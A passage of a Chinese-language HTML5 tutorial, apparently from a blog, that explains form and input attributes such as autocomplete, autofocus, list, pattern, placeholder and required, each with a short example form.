tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">oninput</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x.value<span class="token punctuation">=</span>parseInt(a.value)+parseInt(b.value)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>range<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>100        + <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>b<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        = <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a b<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>output</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="表单属性"><a href="#表单属性" class="headerlink" title="表单属性"></a>表单属性</h2><ol><li><p><strong>autocomplete</strong>  </p><ul><li>将使浏览器记录所提交的表单值,并在之后的提交中降至前的提交作为选项列举出来供选择  </li><li>部分浏览器需要开启此功能才能使该属性生效  </li><li>autocomplete 适用于 <code>&lt;form&gt;</code> 标签，以及以下类型的 <code>&lt;input&gt;</code> 标签：text, search, url, telephone, email, password, datepickers, range 以及 color。   </li><li>相关代码  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>path<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>on<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>   Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>   E-mail:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>autofocus</strong>  </p><ul><li>在页面加载时,域自动获得焦点,也就是将鼠标自定放在域内  </li><li>autofocus属性适用于所有<code>&lt;input&gt;</code>标签类型  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>html<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span> <span class="token attr-name">autofocus</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>autofocus<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>form</strong>  </p><ul><li>form属性规定输入域所属的一个或多个表单  </li><li>form属性适用于所有<code>&lt;input&gt;</code>标签的类型  </li><li>form属性必须引用所属表单的<code>id</code>  </li><li><code>&lt;form&gt;&lt;/form&gt;</code>这个是标签不是form属性,<code>&lt;input form=&quot;&quot;&gt;</code>这个是属性  </li><li>如需引用一个以上的表单,使用空格分隔的列表  </li><li>简单源码  <pre class="line-numbers language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>G:\桌面\1.md<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>下面的输入域在form元素以外,但仍是表单的一部分.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_form<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>表单重写属性</strong>  </p><ul><li><p>允许重写form元素的某些属性设定  </p></li><li><p>适用于<code>&lt;input&gt;</code>标签的<code>submit</code>和<code>image</code>  </p></li><li><p>这些属性对于创建不同的提交按钮有帮助  </p></li><li><p>属性于用途  </p><table><thead><tr><th align="center">属性</th><th align="center">重写</th></tr></thead><tbody><tr><td align="center">formaction</td><td align="center">action</td></tr><tr><td align="center">formenctype</td><td align="center">enctype</td></tr><tr><td align="center">formnovalidate</td><td align="center">novalidate</td></tr><tr><td align="center">formmethod</td><td align="center">method</td></tr><tr><td align="center">formtarget</td><td align="center">target</td></tr></tbody></table><ul><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>html<span class="token punctuation">"</span></span> <span class="token attr-name">methon</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       E-mail:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userid<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>       <span class="token comment" spellcheck="true">&lt;!--更改属性,不进行验证是否符合input的类型--></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">formnovalidate</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ture<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit without validation<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul></li></ol><ol start="5"><li><p><strong>height 和 width</strong>    </p><ul><li>规定用于<code>image</code>类型的<code>input</code>标签的图像的高度和宽度   </li><li>仅适用于<code>image</code>类型的<code>&lt;input&gt;</code>标签  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>html<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     User name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_name<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>img/IMG_20180926_194715.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>houze<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>99<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>99<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>list属性</strong>  </p><ul><li>规定输入域的datalist  </li><li>datalist是输入域的选项列表  </li><li>适用于以下<code>&lt;input&gt;</code>标签:<code>test</code>,<code>search</code>,<code>url</code>,<code>telephone</code>, <code>email</code>, <code>date pickers</code>, <code>number</code>, <code>range</code>, <code>color</code>  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>html<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       Webpage:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url_list<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>datalist</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url_list<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>W3Shollo<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3school.com.cn<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Google<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.google.com<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Microsoft<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.microsoft.com<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>datalist</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>min, max 和 step</strong>  </p><ul><li>为包含数字或日期的<code>input</code>类型提供约束  </li><li><code>max</code>最大值, <code>min</code>最小值, <code>step</code>输入域规定合法的数组间隔  </li><li>适用于以下类型的 <code>&lt;input&gt;</code> 标签：<code>date pickers</code>、<code>number</code> 以及 <code>range</code>  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"> <span class="token comment" spellcheck="true">&lt;!--，该域接受介于 0 到 10 之间的值，且步进为 3（即合法的值为 0、3、6 和 9)--></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      Points: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>points<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">step</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>multiple</strong>  </p><ul><li>规定输入域中可选多个值  </li><li>使用于<code>eamil</code>和<code>file</code>类型的<code>&lt;input&gt;</code>标签  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>html<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        Select images:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>img<span class="token punctuation">"</span></span> <span class="token attr-name">multiple</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multiple<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>当浏览文件时,请试着选择多个文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>novalidata</strong>  </p><ul><li>规定在提交表单时不应该验证<code>form</code>或<code>input</code>域  </li><li>属性适用于 <code>&lt;form&gt;</code> 以及以下类型的 <code>&lt;input&gt;</code> 标签：<code>text</code>, <code>search</code>, <code>url</code>, <code>telephone</code>, <code>email</code>, <code>password</code>, <code>date pickers</code>, <code>range</code> 以及 <code>color</code>.  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">novalidate</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         E-mail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_email<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>pattern</strong>  </p><ul><li>规定用于验证 input 域的模式（pattern),其实也是限定输入格式  </li><li>模式（pattern） 是正则表达式  </li><li>适用于以下类型的 <code>&lt;input&gt;</code> 标签：<code>text</code>, <code>search</code>, <code>url</code>, <code>telephone</code>, <code>email</code> 以及 <code>password</code>  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--下面的例子显示了一个只能包含三个字母的文本域（不含数字及特殊字--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       Country code: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span>   <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>country_code<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>[A-z]{3}<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Three letter country code<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>placeholder</strong>  </p><ul><li>提供一种提示（hint），描述输入域所期待的值  </li><li>于以下类型的 <code>&lt;input&gt;</code> 标签：<code>text</code>, <code>search</code>, <code>url</code>, <code>telephone</code>, <code>email</code> 以及 <code>password</code>  </li><li>提示（hint）会在输入域为空时显示出现，会在输入域获得焦点时消失  </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user_search<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Search W3School<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>require</strong>  </p><ul><li>属性规定必须在提交之前填写输入域（不能为空)  </li><li>适用于以下类型的 <code>&lt;input&gt;</code> 标签：<code>text</code>, <code>search</code>, <code>url</code>, <code>telephone</code>, <code>email</code>, <code>password</code>, <code>date pickers</code>, <code>number</code>, <code>checkbox</code>, <code>radio</code> 以及 <code>file</code>。   </li><li>简单代码  <pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/HTML 5/demo_form.asp<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         Name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>usr_name<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>required<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><ul><li><p><code>&lt;a&gt;</code> 超链接标签  